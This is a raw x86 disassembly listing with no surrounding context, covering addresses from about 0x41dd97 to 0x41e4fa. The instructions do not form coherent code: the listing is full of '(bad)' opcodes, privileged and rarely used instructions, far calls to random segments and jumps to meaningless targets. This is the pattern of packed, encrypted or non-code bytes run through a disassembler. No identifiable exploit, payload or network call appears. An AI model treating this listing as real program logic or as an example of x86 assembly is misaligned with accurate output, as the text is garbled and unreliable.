  41dd97:	sbb    ch,BYTE PTR [ecx+0x2cf964f5]
  41dd9d:	call   0xe9853a92
  41dda2:	imul   eax,DWORD PTR [ebx],0xfbecff11
  41dda8:	and    bl,dl
  41ddaa:	pop    ds
  41ddab:	fidivr WORD PTR [esi]
  41ddad:	xchg   edi,eax
  41ddaf:	add    esp,ebp
  41ddb1:	imul   edx,DWORD PTR [edx+0x28d2a500],0xa747d05
  41ddbb:	fwait
  41ddbc:	mov    esi,0x74e37e4e
  41ddc1:	imul   DWORD PTR [ebx-0x434a388b]
  41ddc7:	xchg   ebx,eax
  41ddc8:	sub    bh,0xd3
  41ddcb:	enter  0xbc4d,0x32
  41ddcf:	sub    eax,0x6cdfddd5
  41ddd4:	push   ss
  41ddd5:	arpl   WORD PTR [edi],sp
  41ddd7:	jbe    0x41dd8d
  41ddd9:	or     DWORD PTR [ebp+0xf],ebx
  41dddc:	call   0x6467:0x5f02344f
  41dde3:	ins    BYTE PTR es:[edi],dx
  41dde4:	shl    edi,1
  41dde6:	in     eax,dx
  41dde7:	int    0x3d
  41dde9:	lahf   
  41ddea:	(bad)  
  41ddec:	fdiv   st(0),st
  41ddee:	test   DWORD PTR [ebx],edi
  41ddf0:	sbb    ebx,DWORD PTR [ebx+ebp*2+0x77]
  41ddf4:	repz rsm 
  41ddf7:	adc    BYTE PTR [edx+0x578d9572],0xfd
  41ddfe:	adc    edx,DWORD PTR [ecx+0x6b4419]
  41de04:	cli    
  41de05:	or     ah,BYTE PTR [esi-0x53a2e43e]
  41de0b:	xchg   BYTE PTR [esi],cl
  41de0d:	repz cli 
  41de0f:	mov    ebx,0xb5785c9b
  41de14:	call   0xcadd980f
  41de19:	ror    ebp,cl
  41de1b:	jmp    DWORD PTR [eax+eiz*2-0x1b]
  41de1f:	xchg   cl,ah
  41de21:	jmp    0x41ddb9
  41de23:	adc    eax,0xdb5451c3
  41de28:	jne    0x41de2a
  41de2a:	mov    dh,0x19
  41de2c:	repnz push 0x5a83e666
  41de32:	arpl   WORD PTR [eax],si
  41de34:	push   esi
  41de35:	add    al,BYTE PTR [ecx]
  41de37:	call   0xa0af:0x3c0c6508
  41de3e:	scas   eax,DWORD PTR es:[edi]
  41de3f:	inc    esi
  41de40:	and    ebx,DWORD PTR [edi-0x2c]
  41de43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de44:	icebp  
  41de45:	(bad)  
  41de46:	push   edi
  41de47:	xchg   esi,eax
  41de48:	cmp    bl,ch
  41de4a:	call   0x97ef:0x7af3ac1a
  41de51:	aaa    
  41de52:	dec    ebp
  41de53:	stos   DWORD PTR es:[edi],eax
  41de54:	or     dl,BYTE PTR [ecx+0x51]
  41de57:	cld    
  41de58:	out    dx,eax
  41de59:	cs stos DWORD PTR es:[edi],eax
  41de5b:	mov    bl,0xb6
  41de5d:	in     al,0x35
  41de5f:	xchg   edx,eax
  41de60:	ss addr16 jno 0x41dee2
  41de64:	cmp    esp,DWORD PTR [edi+esi*4+0x23bee7c5]
  41de6b:	push   edi
  41de6c:	xor    DWORD PTR ds:0xd697361b,esp
  41de72:	ret    0x8212
  41de75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de76:	js     0x41de02
  41de78:	into   
  41de79:	pop    ss
  41de7a:	inc    esp
  41de7b:	adc    eax,0xfefc3ec3
  41de80:	mov    edi,0x7d00bb31
  41de85:	popf   
  41de86:	in     al,0x2b
  41de88:	adc    DWORD PTR [esp+eax*8],esp
  41de8b:	and    esp,esp
  41de8d:	xchg   edx,eax
  41de8e:	pop    edi
  41de8f:	mov    BYTE PTR [edi-0x51ef10bd],ch
  41de95:	stos   DWORD PTR es:[edi],eax
  41de96:	push   edi
  41de97:	mov    ecx,0xc7f9fa0b
  41de9c:	cdq    
  41de9d:	fsubr  st,st(7)
  41de9f:	push   ecx
  41dea0:	out    0xba,al
  41dea2:	mov    ebp,0x709ca837
  41dea7:	stos   BYTE PTR es:[edi],al
  41dea8:	fsubrp st(4),st
  41deaa:	imul   ebp
  41deac:	gs sub eax,0x7a32f3f7
  41deb2:	or     esi,DWORD PTR [edx]
  41deb4:	jbe    0x41df13
  41deb6:	jnp    0x41de44
  41deb8:	loope  0x41de4d
  41deba:	enter  0x2a83,0x5c
  41debe:	mov    ecx,0x4527f8c0
  41dec3:	in     al,dx
  41dec4:	cli    
  41dec5:	leave  
  41dec6:	mov    ebp,0x693e7055
  41decb:	mov    esi,0x6d3bf28e
  41ded0:	dec    edx
  41ded1:	int3   
  41ded2:	data16 mov es,WORD PTR [ebx-0x7dfa9f4c]
  41ded9:	xchg   ebp,eax
  41deda:	fsubr  QWORD PTR ds:0xc51e7f48
  41dee0:	push   edi
  41dee1:	mov    DWORD PTR [esi],ebx
  41dee3:	xor    cl,cl
  41dee5:	and    edx,edx
  41dee7:	add    BYTE PTR [edx+0x100f2ea7],ch
  41deed:	xchg   edi,eax
  41deee:	retf   
  41deef:	(bad)  
  41def0:	shl    edx,cl
  41def2:	std    
  41def3:	and    ebp,edi
  41def5:	sbb    eax,0x547c1729
  41defa:	in     eax,0x77
  41defc:	cwde   
  41defd:	mov    DWORD PTR [edx],edx
  41deff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df00:	push   esi
  41df01:	fnstsw WORD PTR [ecx-0x546e4419]
  41df07:	mov    eax,0x51e993bf
  41df0c:	sahf   
  41df0d:	jecxz  0x41ded4
  41df0f:	cmp    al,0xd8
  41df11:	shl    al,1
  41df13:	popa   
  41df14:	rol    ebx,cl
  41df16:	scas   eax,DWORD PTR es:[edi]
  41df17:	aam    0x10
  41df19:	gs pop ss
  41df1b:	scas   eax,DWORD PTR es:[edi]
  41df1c:	mov    esp,DWORD PTR [ecx+0x7fedf3ea]
  41df22:	jnp    0x41deec
  41df24:	inc    edx
  41df25:	cmp    DWORD PTR [esi],ebx
  41df27:	xchg   ebp,eax
  41df28:	repz lahf 
  41df2a:	call   0x8293:0x4333d09e
  41df31:	or     eax,0x90ded90
  41df36:	imul   edi,eax,0x65df6a23
  41df3c:	mov    edi,0xa53a1acf
  41df41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df42:	and    eax,0x6f071914
  41df47:	mov    edi,0x3fc96fad
  41df4c:	push   cs
  41df4d:	xor    al,0x9f
  41df4f:	push   0xffffffc1
  41df51:	or     al,0x6e
  41df53:	cwde   
  41df54:	or     DWORD PTR [edi],ecx
  41df56:	sbb    dh,BYTE PTR [ecx-0x6b9bccc1]
  41df5c:	adc    eax,0xa864d2
  41df61:	outs   dx,DWORD PTR ds:[esi]
  41df62:	add    DWORD PTR [ebp-0x59],0xffffff89
  41df66:	mov    ebx,0x922a56e6
  41df6b:	mov    WORD PTR [ebp+ebp*4-0x705a72d6],?
  41df72:	mov    ecx,0xb900f443
  41df77:	mov    esi,0x4c73750b
  41df7c:	mov    DWORD PTR [edx+0x704da850],0xf423e1f1
  41df86:	pop    esp
  41df87:	and    esi,DWORD PTR ds:0x244889b5
  41df8d:	leave  
  41df8e:	xchg   edi,eax
  41df8f:	cwde   
  41df90:	out    0xf,eax
  41df92:	sahf   
  41df93:	jno    0x41dfc9
  41df95:	test   BYTE PTR [ecx+0x3f4618fb],bl
  41df9b:	add    al,0x17
  41df9d:	shr    BYTE PTR [ecx+0x9a93625],1
  41dfa3:	in     al,0xe6
  41dfa5:	jl     0x41df3d
  41dfa7:	mov    edx,0xaf4ccf65
  41dfac:	adc    DWORD PTR [ebp-0x5f],0xffffffbb
  41dfb0:	pop    es
  41dfb1:	fwait
  41dfb2:	cmp    cl,BYTE PTR [ebp-0x79ab7a2a]
  41dfb8:	das    
  41dfb9:	push   ss
  41dfba:	fcom   QWORD PTR [ebx]
  41dfbc:	je     0x41df66
  41dfbe:	fnstsw WORD PTR [ebx]
  41dfc0:	inc    esp
  41dfc1:	pop    bp
  41dfc3:	bound  ebp,QWORD PTR [ebp-0x31]
  41dfc6:	ins    DWORD PTR es:[edi],dx
  41dfc7:	inc    ecx
  41dfc8:	and    al,0xc1
  41dfca:	stos   DWORD PTR es:[edi],eax
  41dfcb:	(bad)  
  41dfcc:	int3   
  41dfcd:	(bad)  
  41dfce:	sbb    eax,0x46ddeb74
  41dfd3:	cs fst st(6)
  41dfd6:	adc    DWORD PTR [edx-0xb1d08c9],eax
  41dfdc:	gs pop ecx
  41dfde:	mov    ch,0x72
  41dfe0:	inc    ebx
  41dfe1:	dec    eax
  41dfe2:	inc    edx
  41dfe3:	cmc    
  41dfe4:	mov    bl,0x6d
  41dfe6:	jg     0x41e032
  41dfe8:	mov    BYTE PTR [edi-0x80],al
  41dfeb:	fidivr WORD PTR [edx]
  41dfed:	mov    esi,0xf832cb53
  41dff2:	icebp  
  41dff3:	imul   esi,DWORD PTR [ecx+esi*8],0xdfc5420c
  41dffa:	fimul  WORD PTR [ecx]
  41dffc:	sub    esp,DWORD PTR [ecx+0x2f]
  41dfff:	in     al,dx
  41e000:	dec    eax
  41e001:	mov    bh,0xd5
  41e003:	aam    0x18
  41e005:	ss cwde 
  41e007:	or     DWORD PTR [ebp+0x73],esi
  41e00a:	imul   esp,DWORD PTR [ebp+0x7af3a5ba],0xfffffffb
  41e011:	push   ss
  41e012:	out    0x7d,eax
  41e014:	aas    
  41e015:	mov    esp,0x71af0c53
  41e01a:	jne    0x41dfc5
  41e01c:	sar    ch,cl
  41e01e:	ffree  st(6)
  41e020:	inc    esi
  41e021:	inc    eax
  41e022:	enter  0x454a,0x50
  41e026:	shl    DWORD PTR [ebx-0x19],0x26
  41e02a:	dec    ebp
  41e02b:	imul   ebx,DWORD PTR [edi+0x18],0x8a1eea21
  41e032:	loopne 0x41e004
  41e034:	jp     0x41e067
  41e036:	cli    
  41e037:	(bad)  
  41e038:	inc    esi
  41e039:	push   edi
  41e03b:	lea    ebx,[ebp+0x24a16fdd]
  41e041:	hlt    
  41e042:	jle    0x41dfc9
  41e044:	dec    ebx
  41e045:	adc    ebx,DWORD PTR [ebp+ecx*2+0x34141a5a]
  41e04c:	popa   
  41e04d:	xchg   esi,eax
  41e04e:	sbb    ecx,ecx
  41e050:	dec    ecx
  41e051:	clc    
  41e052:	arpl   WORD PTR [eax-0x1b6b7dd6],si
  41e058:	adc    al,0x26
  41e05a:	call   0xf207:0x4ca46708
  41e061:	push   es
  41e062:	mov    al,0x7f
  41e064:	push   edx
  41e065:	js     0x41e018
  41e067:	push   es
  41e068:	pop    ebx
  41e069:	ret    
  41e06a:	jmp    0x4b707d04
  41e06f:	jge    0x41e000
  41e071:	stc    
  41e072:	lods   eax,DWORD PTR ds:[esi]
  41e073:	mov    eax,ds:0x1449363f
  41e078:	jbe    0x41e0f7
  41e07a:	retf   
  41e07b:	push   ecx
  41e07c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e07d:	outs   dx,BYTE PTR ds:[esi]
  41e07e:	hlt    
  41e07f:	cs inc ebx
  41e081:	imul   ebp,DWORD PTR [ebp-0x757c121a],0x5bb5117f
  41e08b:	mov    ch,0xdb
  41e08d:	int    0x4a
  41e08f:	xor    ch,cl
  41e091:	rcr    BYTE PTR [ecx-0x63504377],0x24
  41e098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e099:	ja     0x41e051
  41e09b:	outs   dx,BYTE PTR ds:[esi]
  41e09c:	sub    al,0x20
  41e09e:	cmp    eax,0x424ded03
  41e0a3:	ins    DWORD PTR es:[edi],dx
  41e0a4:	xchg   esi,eax
  41e0a5:	ins    DWORD PTR es:[edi],dx
  41e0a6:	lods   al,BYTE PTR ds:[esi]
  41e0a7:	iret   
  41e0a8:	pop    ecx
  41e0a9:	xor    DWORD PTR [eax-0x35],ecx
  41e0ac:	inc    esi
  41e0ad:	imul   ecx,DWORD PTR [esi-0x56],0xfffffff7
  41e0b1:	dec    edi
  41e0b2:	inc    esi
  41e0b3:	test   BYTE PTR [eax+ebx*2-0x4f],cl
  41e0b7:	cmp    al,0x76
  41e0b9:	imul   esi,DWORD PTR [edx+0x6ad3639b],0xd1c8bb99
  41e0c3:	pop    ebx
  41e0c4:	ds mov ecx,0xbc198a60
  41e0ca:	dec    esi
  41e0cb:	jmp    0x9d7b:0x4fc0ad73
  41e0d2:	inc    ebp
  41e0d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0d4:	adc    ecx,DWORD PTR [edx+ebp*2]
  41e0d7:	sbb    eax,0x898e3301
  41e0dc:	mov    eax,0x6dcd3a0e
  41e0e1:	scas   al,BYTE PTR es:[edi]
  41e0e2:	mov    BYTE PTR [edx+0x5d65066c],ah
  41e0e8:	loopne 0x41e15f
  41e0ea:	es ins BYTE PTR es:[edi],dx
  41e0ec:	shl    BYTE PTR [esi],0x62
  41e0ef:	ds mov eax,0xba21ab72
  41e0f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0f6:	sub    al,0xfb
  41e0f8:	jp     0x41e0db
  41e0fa:	push   ss
  41e0fb:	addr16 mov dl,0xdd
  41e0fe:	xchg   esi,eax
  41e0ff:	pop    ds
  41e100:	jmp    0xd0c8:0x5a24f528
  41e107:	fcmove st,st(1)
  41e109:	imul   esp,DWORD PTR [esi+0x52e7b9b2],0x364597d
  41e113:	lds    edx,FWORD PTR [eax]
  41e115:	jg     0x41e0cb
  41e117:	mov    edx,0x3ff7f5c9
  41e11c:	add    ebx,ecx
  41e11e:	mov    cl,0x60
  41e120:	gs (bad) 
  41e122:	dec    edx
  41e123:	and    bl,BYTE PTR [edx+ecx*4]
  41e126:	aam    0x46
  41e128:	dec    BYTE PTR [edx]
  41e12a:	aam    0x47
  41e12c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e12d:	sbb    al,0x1f
  41e12f:	pop    esp
  41e130:	cli    
  41e131:	ror    DWORD PTR [ecx+0x54babc9],0x3f
  41e138:	xchg   esp,eax
  41e139:	cs iret 
  41e13b:	xchg   BYTE PTR [eax],bh
  41e13d:	lahf   
  41e13e:	and    eax,0xed1d2ffd
  41e143:	xchg   ebx,eax
  41e144:	push   edi
  41e145:	push   0xe46bf29c
  41e14a:	sub    al,0x60
  41e14c:	lds    ebx,FWORD PTR [edi]
  41e14e:	xor    edi,DWORD PTR ds:0x1a7f205
  41e154:	add    esp,esp
  41e156:	or     ebp,esi
  41e158:	clc    
  41e159:	hlt    
  41e15a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e15b:	jbe    0x41e129
  41e15d:	xlat   BYTE PTR ds:[ebx]
  41e15e:	dec    edx
  41e15f:	sbb    cl,0x9
  41e162:	shr    BYTE PTR [edi],0x96
  41e165:	fcom   DWORD PTR [ebx]
  41e167:	call   ebx
  41e169:	ja     0x41e12d
  41e16b:	mov    ch,0xc4
  41e16d:	(bad)  
  41e16e:	push   ds
  41e16f:	neg    DWORD PTR [ecx]
  41e171:	dec    edx
  41e172:	fs icebp 
  41e174:	imul   eax,DWORD PTR [ebx],0x63
  41e177:	inc    eax
  41e178:	pop    edx
  41e179:	cmc    
  41e17a:	cmp    al,0x5
  41e17c:	dec    esi
  41e17d:	sub    al,0x54
  41e17f:	cdq    
  41e180:	mov    DWORD PTR [esi-0x7332ac58],0xb67f2918
  41e18a:	mov    eax,0xb7bdc8b2
  41e18f:	out    0xb2,al
  41e191:	mov    bh,0xb
  41e193:	xor    al,0xb
  41e195:	push   ebp
  41e196:	mov    dh,BYTE PTR [ecx-0x217284df]
  41e19c:	leave  
  41e19d:	push   edx
  41e19e:	sub    BYTE PTR [edx-0x7e],ah
  41e1a1:	jnp    0x41e19e
  41e1a3:	mov    bl,0xbb
  41e1a5:	mov    ah,0xb1
  41e1a7:	cli    
  41e1a8:	push   edx
  41e1a9:	cmp    DWORD PTR [ebx+0x50],ebp
  41e1ac:	dec    edi
  41e1ad:	inc    esi
  41e1ae:	push   eax
  41e1af:	test   BYTE PTR [esi-0x603f6e5d],dl
  41e1b5:	pop    edi
  41e1b6:	test   eax,0x8fb41227
  41e1bb:	xor    eax,0x9e5408e7
  41e1c0:	mov    dl,0x36
  41e1c2:	in     eax,dx
  41e1c3:	mov    bh,0x6e
  41e1c5:	push   edx
  41e1c6:	xchg   ebx,esp
  41e1c8:	pop    eax
  41e1c9:	test   BYTE PTR [ebx-0x15307d3d],al
  41e1cf:	xor    BYTE PTR [ecx],ah
  41e1d1:	mov    eax,ds:0xb1bc414a
  41e1d6:	cmc    
  41e1d7:	and    al,0xce
  41e1d9:	stos   DWORD PTR es:[edi],eax
  41e1da:	sti    
  41e1db:	push   esi
  41e1dc:	ins    BYTE PTR es:[edi],dx
  41e1dd:	repz add ebp,DWORD PTR [edi+0x69d1da99]
  41e1e4:	dec    ebp
  41e1e5:	fwait
  41e1e6:	stc    
  41e1e7:	pop    esp
  41e1e8:	fldcw  WORD PTR [esi-0x24faa5f5]
  41e1ee:	outs   dx,DWORD PTR ds:[esi]
  41e1ef:	adc    DWORD PTR [ebp-0x344e25a4],0xbb7c1335
  41e1f9:	outs   dx,DWORD PTR ds:[esi]
  41e1fa:	daa    
  41e1fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1fc:	test   eax,0xdff7a104
  41e201:	dec    ebx
  41e202:	ja     0x41e206
  41e204:	cmp    BYTE PTR [eax+0x6fa5d137],bh
  41e20a:	repnz out dx,al
  41e20c:	ds lock dec ebp
  41e20f:	dec    esi
  41e210:	xchg   esi,eax
  41e211:	pop    esi
  41e212:	stos   BYTE PTR es:[edi],al
  41e213:	int3   
  41e214:	mov    ebx,0xe653c26b
  41e219:	mov    dl,0x80
  41e21b:	and    eax,ebx
  41e21d:	push   ss
  41e21e:	sahf   
  41e21f:	jne    0x41e266
  41e221:	stos   BYTE PTR es:[edi],al
  41e222:	gs ror dh,1
  41e225:	daa    
  41e226:	std    
  41e227:	mov    dl,0xed
  41e229:	mov    ecx,0xf8ccc6e6
  41e22e:	sti    
  41e22f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e230:	test   bh,ch
  41e232:	mov    dh,BYTE PTR [edi-0x7]
  41e235:	sqrtps xmm6,XMMWORD PTR [ecx-0x3a]
  41e239:	jb     0x41e217
  41e23b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e23c:	sti    
  41e23d:	cmp    DWORD PTR [edi*8-0x35e4171a],ebx
  41e244:	sar    BYTE PTR [eax-0x52],1
  41e247:	imul   ebp,DWORD PTR [esi-0x1b],0x3c
  41e24b:	inc    eax
  41e24c:	cwde   
  41e24d:	xor    esp,esi
  41e24f:	clc    
  41e250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e251:	xchg   edi,eax
  41e252:	push   esp
  41e253:	add    DWORD PTR [ebp-0x4d],edi
  41e256:	leave  
  41e257:	adc    dh,BYTE PTR [esi]
  41e259:	cmp    BYTE PTR [ecx],0x40
  41e25c:	retf   
  41e25d:	fsub   DWORD PTR [edi]
  41e25f:	and    esi,eax
  41e261:	and    DWORD PTR [eax],eax
  41e263:	scas   eax,DWORD PTR es:[edi]
  41e264:	push   0x58
  41e266:	mov    dl,0xe1
  41e268:	sbb    bl,bh
  41e26a:	aad    0xe
  41e26c:	enter  0x6c8c,0xdd
  41e270:	pop    ebx
  41e271:	or     DWORD PTR [edx+ebp*2-0x6b],0x38bc7c3e
  41e279:	es push edi
  41e27b:	cmp    esi,DWORD PTR [edi-0x64e0adc1]
  41e281:	test   al,0x3d
  41e283:	sti    
  41e284:	pop    edi
  41e285:	into   
  41e286:	sub    eax,0x415d2e08
  41e28b:	imul   DWORD PTR [ebx+0x51d11b90]
  41e291:	fs push ds
  41e293:	sbb    DWORD PTR [ebp+0xff6949b],0x5d
  41e29a:	and    BYTE PTR [ecx-0x2fb8360e],bl
  41e2a0:	xchg   DWORD PTR [eax-0x79],esi
  41e2a3:	retf   0x2b6c
  41e2a6:	pop    ebp
  41e2a7:	pop    ecx
  41e2a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2a9:	shufps xmm3,XMMWORD PTR [eax],0xa7
  41e2ad:	and    BYTE PTR [edi-0x4840b329],ah
  41e2b3:	not    DWORD PTR [edi]
  41e2b5:	push   ebp
  41e2b6:	sub    DWORD PTR [ecx+0x6818bdf0],0xa6c8f90
  41e2c0:	lds    edi,FWORD PTR [esi-0x1931ee31]
  41e2c6:	push   ebx
  41e2c7:	pop    ss
  41e2c8:	xchg   esp,eax
  41e2c9:	inc    ebx
  41e2ca:	aam    0xec
  41e2cc:	add    BYTE PTR ds:0x3d426f52,0x9c
  41e2d3:	xchg   ebp,eax
  41e2d4:	pop    ss
  41e2d5:	xchg   esi,eax
  41e2d6:	cmp    al,0xa8
  41e2d8:	ja     0x41e31c
  41e2da:	sbb    al,0xeb
  41e2dc:	ret    
  41e2dd:	imul   edi
  41e2df:	add    bh,BYTE PTR [ebp+0x6fdcabed]
  41e2e5:	test   BYTE PTR [eax],0xc
  41e2e8:	in     al,dx
  41e2e9:	or     cl,BYTE PTR [ebp-0x12a71824]
  41e2ef:	jo     0x41e297
  41e2f1:	std    
  41e2f2:	stc    
  41e2f3:	sbb    BYTE PTR [edx+0x5fe9ee3c],al
  41e2f9:	pop    esp
  41e2fa:	sub    BYTE PTR [esi],cl
  41e2fc:	inc    ebx
  41e2fd:	sub    esp,edx
  41e2ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e300:	ss sub esp,ebp
  41e303:	popf   
  41e304:	scas   al,BYTE PTR es:[edi]
  41e305:	adc    DWORD PTR [esi-0x5b],edx
  41e308:	aad    0x28
  41e30a:	iret   
  41e30b:	pop    ss
  41e30c:	enter  0x850a,0x3d
  41e310:	sbb    BYTE PTR ds:0x50f4e8d1,bh
  41e316:	jns    0x41e2c8
  41e318:	push   ss
  41e319:	outs   dx,DWORD PTR ds:[esi]
  41e31a:	dec    ecx
  41e31b:	push   edi
  41e31c:	ins    BYTE PTR es:[edi],dx
  41e31d:	cmp    al,0x53
  41e31f:	mov    es,WORD PTR [esp+ebp*4-0x2277ec0a]
  41e326:	popa   
  41e327:	out    dx,al
  41e328:	stos   BYTE PTR es:[edi],al
  41e329:	ins    BYTE PTR es:[edi],dx
  41e32a:	lods   al,BYTE PTR ds:[esi]
  41e32b:	xor    dh,BYTE PTR [ebp+eax*1+0x44]
  41e32f:	cmp    al,0xcc
  41e331:	push   eax
  41e332:	(bad)  
  41e333:	mov    cl,0x9a
  41e335:	lods   eax,DWORD PTR ds:[esi]
  41e336:	sbb    eax,0x74d9fe90
  41e33b:	jo     0x41e363
  41e33d:	ds nop
  41e33f:	fldcw  WORD PTR [edi+0x73]
  41e342:	stc    
  41e343:	in     eax,0xf9
  41e345:	push   0xf97ad3d9
  41e34a:	inc    eax
  41e34b:	push   esi
  41e34c:	imul   ecx,DWORD PTR [edi+0x7f9838c5],0x3203d81
  41e356:	inc    esp
  41e357:	sar    DWORD PTR [eax+0x2b],cl
  41e35a:	push   ebp
  41e35b:	stc    
  41e35c:	and    al,0xc8
  41e35e:	xor    al,0xa
  41e360:	(bad)
  41e363:	mov    ds:0xf5d0c441,eax
  41e368:	mov    al,0xc6
  41e36a:	jne    0x41e318
  41e36c:	and    BYTE PTR [ebp-0xa],dh
  41e36f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e370:	(bad)  
  41e371:	test   dh,0xe0
  41e374:	daa    
  41e375:	nop
  41e376:	hlt    
  41e377:	mov    ch,0x5f
  41e379:	out    dx,eax
  41e37a:	fmul   DWORD PTR [edx+0x36]
  41e37d:	pmaxub mm1,mm7
  41e380:	or     al,0x72
  41e382:	xchg   esi,eax
  41e383:	push   ebp
  41e384:	aas    
  41e385:	and    edi,DWORD PTR [ebp+0x2e]
  41e388:	inc    esp
  41e389:	aaa    
  41e38a:	popa   
  41e38b:	mov    al,0xe5
  41e38d:	sub    DWORD PTR [edx+esi*2],0x9b3612b8
  41e394:	and    al,0x27
  41e396:	ret    
  41e397:	xchg   DWORD PTR [esi+0x35],edi
  41e39a:	and    dl,dl
  41e39c:	mov    ebp,0x4a6aa8a8
  41e3a1:	sub    DWORD PTR [edi],esi
  41e3a3:	mov    esp,0x534f61e
  41e3a8:	ins    BYTE PTR es:[edi],dx
  41e3a9:	(bad)  
  41e3aa:	sub    eax,0xd909528e
  41e3af:	pop    edx
  41e3b0:	nop
  41e3b1:	icebp  
  41e3b2:	and    al,0xc4
  41e3b4:	in     eax,0xc0
  41e3b6:	loop   0x41e3b0
  41e3b8:	stc    
  41e3b9:	mov    dh,0xf1
  41e3bb:	push   esp
  41e3bc:	(bad)  
  41e3bd:	jb     0x41e3e9
  41e3bf:	ins    DWORD PTR es:[edi],dx
  41e3c0:	mov    ds:0xd3e56759,eax
  41e3c5:	jno    0x41e3ee
  41e3c7:	mov    esp,fs
  41e3c9:	test   al,0x7c
  41e3cb:	lods   eax,DWORD PTR fs:[esi]
  41e3cd:	or     al,0xa0
  41e3cf:	push   esi
  41e3d0:	inc    ebx
  41e3d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3d2:	scas   eax,DWORD PTR es:[edi]
  41e3d3:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3d5:	sub    eax,esp
  41e3d7:	mov    edx,edx
  41e3d9:	mov    ah,0xc8
  41e3db:	inc    ebp
  41e3dc:	add    esp,DWORD PTR [edi-0x3cec9249]
  41e3e2:	fstp   TBYTE PTR [eax-0x23]
  41e3e5:	call   0xa3f21361
  41e3ea:	sti    
  41e3eb:	cmp    BYTE PTR [ebp+0x24],ch
  41e3ee:	xchg   ebp,eax
  41e3ef:	stos   DWORD PTR es:[edi],eax
  41e3f0:	xchg   ebp,eax
  41e3f1:	mov    eax,ds:0xcd1c013a
  41e3f6:	jbe    0x41e3f4
  41e3f8:	imul   eax,DWORD PTR [edi-0x52006c01],0x30
  41e3ff:	push   edi
  41e400:	lock popf 
  41e402:	jg     0x41e3ef
  41e404:	sbb    BYTE PTR [eax],cl
  41e406:	push   esp
  41e407:	or     dl,BYTE PTR [bx+0x1d]
  41e40b:	jae    0x41e469
  41e40d:	and    eax,0xd9ae1078
  41e412:	push   edx
  41e413:	jp     0x41e456
  41e415:	fistp  QWORD PTR [ebp+0x8f602d0]
  41e41b:	pop    es
  41e41c:	iret   
  41e41d:	adc    cl,ch
  41e41f:	fst    DWORD PTR ds:0x88163689
  41e425:	dec    edi
  41e426:	out    0xfe,al
  41e428:	inc    esi
  41e429:	jmp    0x3f56:0x821f3c78
  41e430:	(bad)  
  41e431:	outs   dx,DWORD PTR ds:[si]
  41e433:	mov    dl,0x11
  41e435:	(bad)  
  41e436:	ins    DWORD PTR es:[edi],dx
  41e437:	jb     0x41e497
  41e439:	push   ebx
  41e43a:	pop    eax
  41e43b:	fdivr  DWORD PTR ds:0xe4d7ab2c
  41e441:	mov    WORD PTR [edx-0x4b],gs
  41e444:	ja     0x41e46a
  41e446:	stos   DWORD PTR es:[edi],eax
  41e447:	ret    
  41e448:	data16 mov ah,0xe
  41e44b:	dec    dl
  41e44d:	pop    edx
  41e44e:	and    DWORD PTR ss:[edi+0x47da2fc6],0x443fc93d
  41e459:	enter  0x6e94,0x89
  41e45d:	xor    cl,bl
  41e45f:	ja     0x41e463
  41e461:	test   BYTE PTR [edx],ch
  41e463:	lock mov cl,dh
  41e466:	inc    edi
  41e467:	(bad)  [ebx]
  41e469:	sub    DWORD PTR [eax+0x59356a18],eax
  41e46f:	sub    al,0xb8
  41e471:	jmp    0x41e4d4
  41e473:	xchg   DWORD PTR [edi+esi*8],edi
  41e476:	cld    
  41e477:	fwait
  41e478:	scas   eax,DWORD PTR es:[edi]
  41e479:	or     BYTE PTR [edx],bh
  41e47b:	jno    0x41e412
  41e47d:	rol    BYTE PTR [esi+0x6d],cl
  41e480:	stc    
  41e481:	pushf  
  41e482:	add    dh,BYTE PTR [esi+0x7a1763da]
  41e488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e489:	mov    dh,0xb2
  41e48b:	inc    ebx
  41e48c:	cs xchg ecx,eax
  41e48e:	cmp    eax,0xc1739f5b
  41e493:	pusha  
  41e494:	aad    0xfc
  41e496:	loopne 0x41e423
  41e498:	stc    
  41e499:	mov    ebx,0x797adf83
  41e49e:	out    0x59,eax
  41e4a0:	ret    0x7d8f
  41e4a3:	adc    esi,DWORD PTR [esp+eax*1+0x7cb77554]
  41e4aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4ab:	add    DWORD PTR [ecx+0x27],0x70
  41e4af:	out    dx,eax
  41e4b0:	iret   
  41e4b1:	inc    edi
  41e4b2:	sub    al,BYTE PTR [ebp+0x76a35936]
  41e4b8:	fadd   DWORD PTR [ebx-0x7]
  41e4bb:	sbb    eax,0xdc78f846
  41e4c0:	repz jmp 0xb637:0x237dc10a
  41e4c8:	fdiv   QWORD PTR [edx+0x2]
  41e4cb:	popf   
  41e4cc:	retf   
  41e4cd:	lock and eax,0x32e3fbce
  41e4d3:	loop   0x41e52f
  41e4d5:	dec    esi
  41e4d6:	clc    
  41e4d7:	std    
  41e4d8:	pusha  
  41e4d9:	dec    eax
  41e4da:	repz sub dl,BYTE PTR [ecx]
  41e4dd:	inc    ebp
  41e4de:	inc    edi
  41e4df:	bound  esi,QWORD PTR [ecx*1+0x317b35be]
  41e4e6:	mov    edi,fs
  41e4e8:	call   FWORD PTR [ebx+0x45d98f78]
  41e4ee:	sub    BYTE PTR [esi+0x32],ah
  41e4f1:	jge    0xf4e624d1
  41e4f7:	adc    edx,eax
  41e4f9:	aas    
  41e4fa:	adc    BYTE PTR [ebx+0x2],ch
